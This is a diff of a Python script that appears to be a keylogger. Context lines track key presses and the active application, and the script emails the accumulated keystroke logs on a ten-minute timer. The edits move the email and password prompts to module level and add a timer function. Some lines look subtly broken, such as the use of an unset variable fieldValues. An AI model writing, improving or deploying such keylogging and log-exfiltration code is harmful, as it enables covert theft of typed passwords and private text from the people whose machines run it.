@@ -45,6 +45,38 @@ logged_data.append( msg )
 old_app = ''
 delete_file = []
 
+mssg = "Enter logon information"
+titleEmail = "Email"
+fieldEmail = []
+fieldValuesEmail = []  # we start with blanks for the values
+fieldValuesEmail = passwordbox( mssg, titleEmail, fieldEmail )
+
+# make sure that none of the fields was left blank
+while 1:
+    if fieldValuesEmail == None: break
+    errmsg = ""
+    for i in range( len( fieldEmail ) ):
+        if fieldValuesEmail[i].strip() == "":
+            errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldEmail[i])
+    if errmsg == "": break  # no problems found
+    fieldValues = passwordbox( errmsg, titleEmail, fieldEmail, fieldValuesEmail )
+print( "Reply was:", fieldValuesEmail )
+
+titlePw = "Pw"
+fieldPw = []
+fieldValuesPw = []  # we start with blanks for the values
+fieldValuesPw = passwordbox( mssg, titlePw, fieldPw )
+
+# make sure that none of the fields was left blank
+while 1:
+    if fieldValuesPw == None: break
+    errmsg = ""
+    for i in range( len( fieldPw ) ):
+        if fieldValuesPw[i].strip() == "":
+            errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldPw[i])
+    if errmsg == "": break  # no problems found
+    fieldValuesPw = passwordbox( errmsg, titleEmail, fieldPw, fieldValues )
+print( "Reply was:", fieldValuesPw )
 
 def on_press(key):
     global old_app
@@ -101,41 +133,16 @@ def write_file(count):
     print( 'written all good' )
 
 
+def timer():
+    MIN = 10
+    SECONDS = 60
+    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
+    # time.sleep( 30 )  # for debugging ~ yes program works :)
+    pass
+
+
 def send_logs():
     count = 0
-
-    mssg = "Enter logon information"
-    titleEmail = "Email"
-    fieldEmail = []
-    fieldValuesEmail = []  # we start with blanks for the values
-    fieldValuesEmail = passwordbox( mssg, titleEmail, fieldEmail )
-
-    # make sure that none of the fields was left blank
-    while 1:
-        if fieldValuesEmail == None: break
-        errmsg = ""
-        for i in range( len( fieldEmail ) ):
-            if fieldValuesEmail[i].strip() == "":
-                errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldEmail[i])
-        if errmsg == "": break  # no problems found
-        fieldValues = passwordbox( errmsg, titleEmail, fieldEmail, fieldValuesEmail )
-    print( "Reply was:", fieldValuesEmail )
-
-    titlePw = "Pw"
-    fieldPw = []
-    fieldValuesPw = []  # we start with blanks for the values
-    fieldValuesPw = passwordbox( mssg, titlePw, fieldPw )
-
-    # make sure that none of the fields was left blank
-    while 1:
-        if fieldValuesPw == None: break
-        errmsg = ""
-        for i in range( len( fieldPw ) ):
-            if fieldValuesPw[i].strip() == "":
-                errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldPw[i])
-        if errmsg == "": break  # no problems found
-        fieldValuesPw = passwordbox( errmsg, titleEmail, fieldPw, fieldValues )
-    print( "Reply was:", fieldValuesPw )
 
     fromAddr = fieldValuesEmail
 
@@ -143,10 +150,6 @@ def send_logs():
 
     toAddr = fieldValuesEmail
 
-    MIN = 10
-    SECONDS = 60
-    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
-    # time.sleep( 30 )  # for debugging ~ yes program works :)
     while True:
         if len( logged_data ) > 1:
             try:
@@ -191,7 +194,7 @@ def send_logs():
                 del logged_data[1:]
                 del delete_file[0:]
                 print( 'delete data/files' )
-
+                timer()
                 count += 1
 
             except Exception as errorString:
